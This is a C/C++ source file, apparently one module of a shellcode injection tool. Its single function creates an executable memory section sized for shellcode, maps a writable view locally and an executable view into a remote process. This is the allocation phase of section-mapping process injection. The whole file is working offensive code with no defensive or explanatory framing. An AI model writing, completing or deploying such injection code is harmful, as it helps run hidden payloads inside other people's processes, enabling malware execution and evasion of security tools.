#include "phases/allocate/section.h"
#include "debug.h"
#include <cstdio>

BOOL AllocateMemory_Section(INJECT_CTX *ctx) {
    DBG("AllocateMemory_Section");
    // create section in local process
    LARGE_INTEGER szSection;
    szSection.QuadPart = ctx->shellcodeSize;

    NTSTATUS status = ctx->api.ntCreateSection(
        &ctx->hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &szSection,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL);
    if (!NT_SUCCESS(status)) {
        DBG("Failed to create section. NTSTATUS: 0x%08X", status);
        ctx->lastStatus = status;
        return FALSE;
    }

    // map section into memory of local process
    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;

    status = ctx->api.ntMapViewOfSection(
        ctx->hSection,
        GetCurrentProcess(),
        &hLocalAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_READWRITE);
    
    if (!NT_SUCCESS(status)) {
        DBG("Failed to map section to local process. NTSTATUS: 0x%08X", status);
        ctx->lastStatus = status;
        return FALSE;
    }

    // map section into memory of remote process

    status = ctx->api.ntMapViewOfSection(
        ctx->hSection,
        ctx->hProcess,
        &ctx->remoteBase,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READ);

    if (!NT_SUCCESS(status)) {
        DBG("Failed to map section to remote process. NTSTATUS: 0x%08X", status);
        ctx->lastStatus = status;
        return FALSE;
    }

    return TRUE;
}
